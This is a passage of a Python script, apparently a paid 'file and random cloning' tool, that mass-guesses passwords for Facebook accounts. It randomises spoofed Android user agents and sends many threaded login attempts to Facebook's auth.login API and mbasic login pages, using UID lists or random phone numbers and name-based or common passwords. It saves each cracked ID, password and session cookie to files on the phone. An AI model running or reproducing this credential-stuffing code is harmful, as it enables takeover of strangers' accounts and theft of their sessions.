   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/593607918;FBAV/405.0.0.8.113;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; moto g(50) 5G Build/S1RSS32.38-20-9-11) [FBAN/Orca-Android;FBAV/416.0.0.9.76;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/491071565;FBCR/TIM;FBMF/motorola;FBBD/motorola;FBDV/moto g(50) 5G;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1462};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 13; SM-A032M Build/TP1A.220624.014) [FBAN/EMA;FBBV/593607918;FBAV/405.0.0.8.113;FBDV/SM-A032M;FBSV/13;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; Android 13; Xiaomi Pad 5 Pro 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.48 Safari/537.36[FBAN/EMA;FBAV/397.0.0.11.117;FBBV/19392060;FBDM/{density=4.0,width=1600,height=2560};FBLC/id_ID;FBCR/72234;FBMF/Xiaomi;FBBD/Pad 5 Pro;FBPN/com.facebook.octa;FBDV/M2105K81C;FBSV/13;nullFBCA/armeabi-v7a:armeabi;]", 
   "Dalvik/2.1.0 (Linux; Android 14; SM-A137F Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.123 Mobile Safari/537.36[FBAN/EMA;FBAV/397.0.0.11.117;FBBV/19392060;FBDM/{density=4.0,width=1600,height=2560};FBLC/id_ID;FBCR/72234;FBMF/Xiaomi;FBBD/Pad 5 Pro;FBPN/com.facebook.octa;FBDV/M2105K81C;FBSV/13;nullFBCA/armeabi-v7a:armeabi;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO CH6 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/457.1.0.45.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/596605429;FBCR/MTN;FBMF/TECNO MOBILE LIMITED;FBBD/TECNO;FBDV/TECNO CH6;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2351};FB_FW/1;]", 
   "Dalvik/1.6.0 (Linux; U; Android 4.4.4; HM 1S MIUI/V8.1.2.0.KHCCNDI) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.132 Mobile Safari/537.36[FBAN/EMA;FBBV/10700816;FBAV/399.0.0.7.120;FBCX/OkHttp3;FBLC/id_ID;FBDV/Xiaomi Redmi 1S;FBNG/4G;FBMNT/METERED;FBDM/DisplayMetrics{density=2.67,width=720,height=1280};]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; SM-A032F Build/SP1A.210812.016) [FBAN/EMA;FBBV/596518710;FBAV/406.0.0.13.119;FBDV/SM-A032F;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6516 Build/SP1A.210812.001) [FBAN/EMA;FBBV/596518710;FBAV/406.0.0.13.119;FBDV/Infinix X6516;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 10; SM-A705FN Build/QP1A.190711.020) [FBAN/FB4A;FBAV/466.1.0.57.85;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/605475609;FBCR/Vodafone;FBMF/samsung;FBBD/samsung;FBDV/SM-A705FN;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2198};FB_FW/1;FBRV/0;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001) [FBAN/EMA;FBBV/609388857;FBAV/411.0.0.10.112;FBDV/TECNO BF6;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; moto g power (2022) Build/S3RQS32.20-42-10-11-2-5) [FBAN/Orca-Android;FBAV/464.0.0.44.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/615296909;FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto g power (2022);FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1481};FB_FW/1;]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6516 Build/SP1A.210812.001) [FBAN/EMA;FBBV/613121005;FBAV/412.0.0.8.106;FBDV/Infinix X6516;FBSV/12;FBCX/OkHttp3;FBDM/{density=2.0}]", 
   "Dalvik/2.1.0 (Linux; U; Android 12; CPH2477 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/464.0.0.44.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/615296909;FBCR/Vodafone KI;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2477;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1460};FB_FW/1;]"]
# Print all predefined user agents
for agent in predefined_user_agents:
    print(agent)
# Add the generated random user agent to the predefined list
all_user_agents = [generate_random_user00_agent()] + predefined_user_agents

# Randomly select a user agent
selected_user_agent = random.choice(all_user_agents)

# Print the selected user agent
print(selected_user_agent)
#-----------------------❲ HOST USER AGENT ❳-----------------------#
def ___sex___():
    version=random.choice(["14","15","10","13","7.0.0","7.1.1","9","12","11","9.0","8.0.0","7.1.2","7.0","4","5","4.4.2","5.1.1","6.0.1","9.0.1"])
    mix = random.choice(["SM-T835","SM-S901U","SM-S134DL","SM-J250F","SM-A217F","SM-A326B","SM-A125F","SM-A720F","SM-A326U","SM-G532M","SM-J410G","SM-A205GN","SM-A205GN","SM-A505GN","SM-G930F","SM-J210F","SM-N9005","SM-J210F","CPH2083","CPH2235", "CPH2499","CPH2185","CPH2065","CPH2197","CPH1989","CPH2145","F1w","CPH1909","CPH2065","CPH1937","CPH2095","CPH2083","CPH2249","CPH2083","CPH2239","CPH1979","CPH2067","CPH2069","CPH2239","CPH2015","CPH2021","CPH2205","CPH2069","CPH2161","CPH2207","CPH2239","CPH1909","CPH2185","CPH2127","CPH1923","CPH1931","PHN110", "CPH2599", "CPH2499", "CPH2557", "CPH8686", "CPH9177", "CPH9226", "OPPO F1 Plus", "CPH2071", "PCHM00", "CPH2083", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH2477", "CPH2471", "CPH2591", "CPH1923", "CPH1925", "CPH1837", "OPPO A30","RMX1945", "RMX1911", "RMX2193", "RMX1945", "RMX1931", "RMX2170", "RMX3201", "RMX2180", "RMX2021", "RMX2020", "RMX2155", "RMX1921", "RMX2156", "RMX3363", "RMX3081", "RMX2001", "RMX2001", "RMX3263", "RMX2155", "RMX2001", "RMX3195", "RMX1945", "RMX1945", "RMX1993","vi"+"vo 1901","V2"+"026","V20"+"58","viv"+"o 1716","vi"+"vo 1808","vi"+"vo 1935","vi"+"vo 1951","vi"+"vo 1906","vivo 1808","vivo 1920","vivo 1901", "V2026","V2058","vivo 1716","vivo 1935","vivo 1951","vivo 1906","V2111","vivo 1915","V1911A","V2036","vivo 1907","vivo 1906","vivo 1915","V2025","vivo 1820","vivo 1904","vivo 1901","V1955A","LG-H342","Redmi Note 4", "Redmi 4X", "Redmi 3", "Redmi 4", "Redmi 3X", "Redmi Note 7", "Redmi 6A", "Redmi Note 8 Pro", "Redmi 5A", "Redmi 5", "Redmi 6 Pro", "Redmi Note 5", "Redmi Note 4", "Redmi Y2", "Redmi 7A", "Redmi Note 7S", "Redmi Note 8T", "Redmi Note 8 Pro", "M2003J15SC", "Redmi 5 Plus", "Redmi Note 9 Pro", "Redmi Note 9S", "LDN-L21", "M2103K19G","RMX1945","RMX1911","RMX2193","RMX1945","RMX1931","RMX2170","RMX3201","RMX2180","RMX2021","RMX2020","RMX2155","RMX1921","RMX2156","RMX3363","RMX3081","RMX2001","RMX2001","RMX3263","RMX2155","RMX2001","RMX3195","RMX1945","RMX1945","RMX1993","RMX2180","RMX3630","RMX3686","RMX1805","RMX1801","RMX2020","RMX1811","RMX3063","RMX3516","RMX3371","RMX3461","RMX3286","RMX3561","RMX3388","RMX3311","RMX3142","RMX2071","RMX1805","RMX1809","RMX1801","RMX1807","RMX1803","RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925","RMX1929","RMX2001","RMX2061","RMX2063","RMX2040","RMX2042","RMX2002","RMX2151","RMX2163","RMX2155","RMX2170","RMX2103","RMX3085","RMX3241","RMX3081","RMX3151","RMX3381","RMX3521","RMX3474","RMX3471","RMX3472","RMX3392","RMX3393","RMX3491","RMX1811","RMX2185","RMX3231","RMX2189","RMX2180","RMX2195","RMX2101","RMX1941","RMX1945","RMX3063","RMX3061","RMX3201","RMX3203","RMX3261","RMX3263","RMX3193","RMX3191","RMX3195","RMX3197","RMX3265","RMX3268","RMX3269","RMX2027","RMX2020","RMX2021","RMX3581","RMX3501","RMX3503","RMX3511","RMX3310","RMX3312","RMX3551","RMX3301","RMX3300","RMX2202","RMX3363","RMX3360","RMX3366","RMX3361","RMX3031","RMX3370","RMX3357","RMX3560","RMX3562","RMX3350","RMX2193","RMX2161","RMX2050","RMX2156","RMX3242","RMX3171","RMX3430","RMX3235","RMX3506","RMX2117","RMX2173","RMX3161","RMX2205","RMX3462","RMX3478","RMX3372","RMX3574","RMX1831","RMX3121","RMX3122","RMX3125","RMX3043","RMX3042","RMX3041","RMX3092","RMX3093","RMX3571","RMX3475","RMX2200","RMX2201","RMX2111","RMX2112","RMX1901","RMX1903","RMX1992","RMX1993","RMX1991","RMX1931","RMX2142","RMX2081","RMX2085","RMX2083","RMX2086","RMX2144","RMX2051","RMX2025","RMX2075","RMX2076","RMX2072","RMX2052","RMX2176","RMX2121","RMX3115","RMX1921","vivo 1906","vivo 1904","vivo Y13L","vivo 1901","V2120","V2204","vivo 1902","V2310","V2333","vivo 1929","vivo 1915","vivo 1811","V2027","V2043","V2038","V2111","V2110","V2206","V2207","vivo Y23L","V2249","vivo 1613","vivo Y28L","vivo 1938","PADM00","CPH1837","PADT00","CPH1803","CPH1853","CPH1805","CPH1931","CPH1959","CPH1933","CPH1935","CPH1943","CPH1909","CPH1901","PDBM00","CPH1941","CPH2179","CPH2083","CPH2185","CPH2185","CPH2477","CPH2591","CHP2219","CPH1923","CPH2213","CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"])
    build = random.choice(['MMB29Q','R16NW','LRX22C','R16NW','KTU84P','JLS36C','NJH47F','PPR1.180610.011','QP1A.190711.020','NRD90M','RP1A.200720.012','M1AJB','MMB29T'])
    ver = str(random.choice(range(77, 577)))
    ver2 = str(random.choice(range(57, 77)))
    return f'''Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36'''
#-----------------------❲ SYS ❳-----------------------#
sys.stdout.write('\x1b]2; >>SHUVO-XD<<\x07')
#-----------------------❲ COLOUR ❳-----------------------#
B = "\033[1;30m";
R = "\033[1;31m";
G = "\033[1;32m";
Y = "\033[1;33m";
BL = "\033[1;34m";
P = "\033[1;35m";
SK = "\033[1;36m";
W= '\033[1;37m'
#-----------------------❲ STYLE ❳-----------------------#
xd=f"{B}❲{G}•{B}❳{W}";xd1=f"{B}❲{G}1{B}❳{W}";xd2=f"{B}❲{G}2{B}❳{W}";xd3=f"{B}❲{G}3{B}❳{W}";xd4=f"{B}❲{G}4{B}❳{W}";xd5=f"{B}❲{G}5{B}❳{W}";xd6=f"{B}❲{G}6{B}❳{W}";xd0=f"{B}❲{G}0{B}❳{W}";xdx=f"{B}❲{G}?{B}❳{W}";xxdx=f"{R}";xxxxd=f"{SK}";xdxx=f"{G}━➤{G}"
#-----------------------❲ CLEAR ❳-----------------------#
def clear():os.system('clear');print(logo)
def linex():print(f'{W}──────────────────────────────────────────────────')
#-----------------------❲ LOGO ❳-----------------------#
logo=(f"""

   {Y} ██████  ██       █████   ██████ ██   ██ 
   {Y} ██   ██ ██      ██   ██ ██      ██  ██  
   {Y} ██████  ██      ███████ ██      █████   
   {Y} ██   ██ ██      ██   ██ ██      ██  ██  
   {Y} ██████  ███████ ██   ██  ██████ ██   ██  
  {P} version •••••••••••••••••••••••••     0.3 V                                     
{W}──────────────────────────────────────────────────
    {Y}, .  .  ,  ,-.  .   ,   ,-.  ,-.   ,-.  
    {Y}| |\ |  | /   \  \ /    |  ) |  ) /   \ 
    {Y}| | \|  | |   |   Y     |-<  |-<  |   | 
    {Y}| |  |  | \   /   |     |  ) |  \ \   / 
    {Y}' '  ' -'  `-'    '     `-'  '  '  `-'  {R} •••••🤫
{W}──────────────────────────────────────────────────
{xdxx} OWNER  {xdxx} SHUVO AHMED
{xdxx} TOOLS  {xdxx} FILE {G}X{G} RANDOM CLONING
{xdxx} STATUS {xdxx} PAID
{W}──────────────────────────────────────────────────""")
#-----------------------❲ RESULT ❳-----------------------#
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print("");linex();print(f'{xdxx} THE PROCESS HAS BEEN COMPLETE...');print(f'{xdxx} TOTAL OK {xdxx} %s' % str(len(oks)));print(f'{xxdx} TOTAL CP {xxdx} %s' % str(len(cps)));linex();exit()
#-----------------------❲ MENU ❳-----------------------#
def ___SHUVO___():
        clear()
        print(f'{xd1} {G}FILE CLONING ');print(f'{xd2} {G}RANDOM CLONING ');print(f'{xd0} {G}EXIT CLONING ');linex()
        option = input(f'{xxdx} SELECT {xdxx} ')
        if option in ['1','A']:___file___()
        elif option in ['2','B']:___random___()
        else:print(f"{xd} OPTION NOT FOUND ");time.sleep(2);___SHUVO___()
#-----------------------❲ FILE INPUT ❳-----------------------#
class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear();print(f"{xd} EXAMPLE {xdxx} /sdcard/SHUVO.txt");linex()
        self.file = input(f'{xdx} FILE NAME {xdxx} ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            linex();print(f'{xd} OPPS FILE NOT FOUND ');time.sleep(2);linex();print(f'{xd} TRY AGAIN ');time.sleep(2);main_crack().crack(id)
#-----------------------❲ FILE METHOD M1 ❳-----------------------#
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{xd} SHUVO-M1 {loop}{G}|{W}{len(oks)}{G}|{W}{len(cps)} ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": sid,"password": ps,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': ___swag___(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{xd}{G} SHUVO-OK {sid} | {ps} ")
                    print(f"\r{xd} COOKIES {cookie}");linex()
                    oks.append(sid)
                    open('/sdcard/SHUVO-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r{xd}{O} SHUVO-CP {sid} | {ps} ")
                     cps.append(sid)
                     open('/sdcard/SHUVO-M1-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                else:continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
#-----------------------❲ FILE METHOD M2 ❳-----------------------#
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{xd} SHUVO-M2 {loop}{G}|{W}{len(oks)}{G}|{W}{len(cps)} ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": sid,"password": ps,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': generate_random_user00_agent(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(3e7,4e7)),
                'X-FB-SIM-HNI': str(random.randint(2e4,4e4)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{xd}{G} SHUVO-OK {sid} | {ps} ")
                    print(f"\r{xd} COOKIES {cookie}");linex()
                    oks.append(sid)
                    open('/sdcard/SHUVO-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{xd}{O} SHUVO-CP {sid} | {ps} ")
                    cps.append(sid)
                    open('/sdcard/SHUVO-M2-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                else:continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodB(sid, name, ps)
#-----------------------❲ FILE METHOD M3 ❳-----------------------#
    def methodC(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r{xd} SHUVO-M3 {loop}{G}|{W}{len(oks)}{G}|{W}{len(cps)} ")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        except:
            ls = fs
        try:
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                session=requests.Session()
                __ua__ = ___sex___()
                getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
                session.headers = {}
                session.headers.update({'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': __ua__, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
                complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{xd}{G} SHUVO-OK {sid} | {ps} ")
                    oks.append(sid)
                    open('/sdcard/SHUVO-M3-FILEOK.txt','a').write(sid+'|'+ps+'\n')
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    print(f"\r{xd}{O} SHUVO-CP {sid} | {ps} ")
                    cps.append(sid)
                    open('/sdcard/SHUVO-M3-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                    break
                else:continue
            loop+=1
        except requests.exceptions.ConnectionError:
             self.methodC(sid, name, ps)
#-----------------------❲ FILE PASSWORD INPUT ❳-----------------------#
    def pasw(self):       
            pw = []
            clear();print(f'{xd} EXAMPLE {xdxx} BANGLADESH 1{G}-{W}20 OTHERS 5{G}-{W}10');linex()
            sl = int(input(f'{xd} PASSWORD LIMIT {xdxx} '))
            clear();print(f'{xd} EXAMPLE {xdxx} firstlast {G}•{W} first12 {G}•{W} first123');linex() 
            if sl =='':print(f'{xd} PASSWORD LIMIT BETWEEN 1 TO 30')
            elif sl > 30:print(f'{xd} PASSWORD LIMIT SHOULD NOT BE GREATER THAN 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'{xd} PASSWORD NO{sr+1} {xdxx} '))
            clear();print(f'{xd} TOTAL FILE UID {xdxx} %s ' % len(self.id));print(f'{xd} FIRST ON{G}|{W}OFF AIRPLANE MODE');linex()
            with SHUVOxd(max_workers=30) as SHUVOworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:SHUVOworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:SHUVOworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:SHUVOworld.submit(self.methodC, uid, name, pwx)
                   except:pass
            result(oks,cps)   
#-----------------------❲ RANDOM ❳-----------------------#
def ___random___():
        clear()
        print(f'{xd1} BANGLADESH CLONING {B}❲{G}HOST METHOD{B}❳{W} ');print(f'{xd2} BANGLADESH CLONING {B}❲{G}API METHOD{B}❳{W}');print(f'{xd3} INDIA CLONING ');print(f'{xd4} NEPAL CLONING ');print(f'{xd5} PAKISTAN CLONING ');print(f'{xd6} AFGHANISTAN CLONING ');linex()
        option = input(f'{xdx} SELECT {xdxx} ')
        if option in ['1','A']:___bd1___()
        elif option in ['2','B']:___bd2___()
        elif option in ['3','C']:___India___()
        elif option in ['4','D']:___Nepal___()
        elif option in ['5','E']:___Pakistan___()
        elif option in ['6','F']:___Afghanistan___()
        else:print(f"{xd} OPTION NOT FOUND ");time.sleep(2);___SHUVO___()
#-----------------------❲ RANDOM BD HOST ❳-----------------------#
def ___bd1___():
    user=[]
    ck=[]
    clear();print(f"{xd} EXAMPLE {xdxx} 017 {G}•{W} 018 {G}•{W} 019 {G}•{W} 016");linex();code = input(f'{xdx} SELECT  {xdxx} ')
    clear();print(f"{xd} EXAMPLE {xdxx} 3000 {G}•{W} 5000 {G}•{W} 9999 {G}•{W} 99999");linex();limit = int(input(f'{xdx} SELECT  {xdxx} '))
    clear();print(f"{xd1} CLONING WITH {B}❲{G}SLOW{B}❳{W}");print(f"{xd2} CLONING WITH {B}❲{G}FAST{B}❳{W}");linex();pasxd = input(f'{xdx} SELECT  {xdxx} ')
    clear();print(f"{xd} COOKIES SHOW Y{G}|{W}N");linex();xmk = input(f'{xdx} SELECT {xdxx} ')
    for _ in range(limit):
        user.append("".join(random.choices(string.digits, k=8)))
    if xmk == "Y" or xmk == "y":
        ck.append("Y")
    elif xmk == "N" or xmk == "n":
        ck.append('N') 
    else:
        ck.append('N')
    with SHUVOxd(max_workers=35) as ___x___:
        clear();tl = str(len(user))
        print(f'{xd} TOTAL UID {xdxx}{G} '+tl);print(f'{xd} SIM CODE  {xdxx}{G} '+code);print(f'{xd} FIRST ON{G}|{W}OFF AIRPLANE MODE');linex()
        for love in user:
            ids = code+love
            if pasxd in ['1','01']:passlist = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:]]
            elif pasxd in ['2','02']:passlist = [love[2:],love,code+love,code+love[:3],'bangladesh','free fire','i love you','708090','203040','506070','ayesha','Bangladesh','jannat']
            ___x___.submit(___HOST___,ids,passlist,tl,ck)
    print('');linex();print(f'{xd} TOTAL OK {xdxx}{G} {str(len(oks))}');print(f'{xd} TOTAL CP {xdxx}{G} {str(len(cps))}');linex();exit()
#-----------------------❲ RANDOM BD API ❳-----------------------#
def ___bd2___():
    os.getuid
    os.geteuid
    clear();print(f"{xd} EXAMPLE {xdxx} 017 {G}•{W} 018 {G}•{W} 019 {G}•{W} 016");linex();code = input(f'{xdx} SELECT  {xdxx} ')
